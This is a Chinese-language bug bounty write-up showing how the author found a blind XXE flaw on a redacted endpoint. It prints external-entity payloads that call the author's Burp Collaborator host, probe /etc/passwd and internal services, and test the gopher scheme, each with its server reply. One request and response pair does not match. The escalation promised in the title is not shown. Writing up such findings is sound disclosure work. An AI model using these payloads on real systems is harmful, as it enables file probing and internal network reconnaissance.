# 从 Blind XXE 到读取根目录文件

在最近的一次 Bug Bounty 活动中，我发现了一个端点（应用服务），其 HTTP 响应数据为 XML 结构。我认为这里可能存在一个 XXE 漏洞。然而，关于这个端点的文档非常有限，唯一的参考资料是一篇由一位心烦意乱的开发人员于2016年撰写的文章。

接下来，我将描述如何将一个中等难度的漏洞提升为高危漏洞的过程和思路。测试过程中遇到的错误信息非常重要，我会特别强调这些信息，希望能为其他人提供有价值的参考。

**注意：** 我已经对端点和其他敏感信息进行了隐藏，因为该漏洞是作为私有披露计划的一部分报告的，受影响的公司不希望发布任何关于其环境或发现的信息。

## 发现的情况

这个端点引起我的注意是因为它返回的是一个简单的 XML 结构的错误信息和 404 状态码。

请求：
```http
GET /interesting/ HTTP/1.1
Host: server.company.com
```

响应：
```http
HTTP/1.1 404 Not Found
Server: nginx
Date: Tue, 04 Dec 2018 10:08:18 GMT
Content-Type: text/xml
Content-Length: 189
Connection: keep-alive

The request is invalid: The requested resource could not be found.
```

当我将请求方法改为 `POST` 并在头部添加 `Content-Type: application/xml`，并在 POST 数据中添加一个无效的 XML 数据时，响应更加确认了存在 XXE 漏洞的可能性。

请求：
```http
POST /interesting/ HTTP/1.1
Host: server.company.com
Content-Type: application/xml
Content-Length: 30

<invalid_xml>
```

响应：
```http
The request is invalid: The request content was malformed:
XML version "abc" is not supported, only XML 1.0 is supported.
```

但是，当我发送一个结构正确的 XML 文档时：

请求：
```http
POST /interesting/ HTTP/1.1
Host: server.company.com
Content-Type: application/xml
Content-Length: 30

<valid_xml>
```

响应：
```http
Authentication failed: The resource requires authentication, which was not supplied with the request
```

显然，服务器需要凭证进行身份验证。遗憾的是，没有任何文档说明如何提供凭证，我也无法找到可能有效的凭证。这可能是个坏消息，因为我以前遇到的许多 XXE 漏洞需要与端点进行某种“有效”交互。如果没有身份验证，利用这个漏洞可能会变得困难得多。

## 尝试包含 DOCTYPE 定义

尽管如此，我决定尝试包含 DOCTYPE 定义的字符串，以查看是否完全禁止使用外部实体，或者是否可以继续追求进一步的利用。

请求：
```xml
<!DOCTYPE foo [ 
  <!ENTITY % ext SYSTEM "http://my-burp-collaborator-server/">
  %ext;
]>
```

响应：
```http
The server was not able to produce a timely response to your request.
```

查看 Burp Collaborator 交互界面，没有收到预期的 HTTP 请求，只有部分信息。幸运的是，服务器明显解析了我的域名，但没有发出 HTTP 请求。此外，几秒钟后服务器返回了 500 错误。

看起来防火墙发挥了作用。我继续尝试针对不同端口的出站 HTTP 请求，但所有端口都超时了，表明受影响的服务器至少可以依赖防火墙成功地阻止所有非预期的出站流量。网络安全团队做得很好！

## 只能做 Blind XXE

在这个阶段，我有一个有趣的发现，但还没有什么真正值得说明的。通过尝试访问本地文件、内部网络和内部服务，我希望能够从中获得一份中危的报告。

为了证明影响，我展示了此漏洞可以用来成功确定文件是否存在：

请求：
```xml
<!DOCTYPE foo [ 
  <!ENTITY % ext SYSTEM "file:///etc/passwd">
  %ext;
]>
```

响应：
```http
The markup declarations contained or pointed to by the document type declaration must be well-formed.
```

这表明文件存在，XML 解析器可以打开和读取文件，但文件的内容不是有效的文档类型定义 (DTD)，因此解析器失败并抛出错误。换句话说，外部实体的加载并没有被禁用，但我们似乎没有得到任何输出。在这个阶段，这似乎是一个 Blind XXE 漏洞。

假设使用的是 Java 的 SAX Parser 解析器，因为报错似乎和 Java 错误类有关。

当访问的文件不存在时，响应如下：

请求：
```xml
<!DOCTYPE foo [ 
  <!ENTITY % ext SYSTEM "file:///nonexistent-file">
  %ext;
]>
```

响应：
```http
The request is invalid: The request content was malformed:
/etc/passwdxxx (No such file or directory)
```

这很有用，但还不够好；如何使用这个 Blind XXE 漏洞作为基本端口扫描器？

请求：
```xml
<!DOCTYPE foo [ 
  <!ENTITY % ext SYSTEM "http://internal-service:8080/">
  %ext;
]>
```

响应：
```http
The request is invalid: The request content was malformed:
Invalid Http response
```

这意味着我们可以列举内部服务。虽然这不是我想要的酷炫结果，但至少是一些值得报告的东西。这种类型的 Blind XXE 有效地表现为与 Blind SSRF 漏洞类似的行为：您可以启动内部 HTTP 请求，但不能读取响应。

这让我怀疑是否可以应用任何其他与 SSRF 相关的技术，以便更好地利用这个 Blind XXE 漏洞。需要检查的一件事是对其他协议的支持，包括 `https`、`gopher`、`ftp`、`jar`、`scp` 等。

请求：
```xml
<!DOCTYPE foo [ 
  <!ENTITY % ext SYSTEM "gopher://internal-service/">
  %ext;
]>
```

响应：
```http
The request is invalid: The request content was malformed:
unknown protocol: gopher
```

这很有趣，因为它将用户提供的协议在错误消息中返回回来。我们把它记下来，以后再用。

考虑到防火墙之前阻止了我的传出流量，我想验证内部流量是否也被阻止了，或者内部网络是否更可信。

请求：
```xml
<!DOCTYPE foo [ 
  <!ENTITY % ext SYSTEM "http://wiki.company.internal/">
  %ext;
]>
```

响应：
```http
The markup declarations contained or pointed to by the document type declaration must be well-formed.
```

有趣的是，我们以前看到过这个错误消息，它表示读取了请求的资源，但没有正确格式化。这意味着允许内部网络通信，并且我们的内部请求成功了！

这就是我们的处境。使用 Blind XXE 漏洞，可以向许多内部 Web 应用程序发起请求，枚举文件系统中文件的存在性，以及枚举在所有内部主机上运行的服务。在这一点上，我报告了这种漏洞，并在周末前往耶路撒冷的城市之旅中思考进一步的可能性。

## 独眼称王

即使在一个受限制的环境中，Blind XXE 漏洞仍然可以发挥巨大的作用。通过巧妙地利用现有条件，我们可以逐步扩大攻击面，最终达到高危漏洞的程度。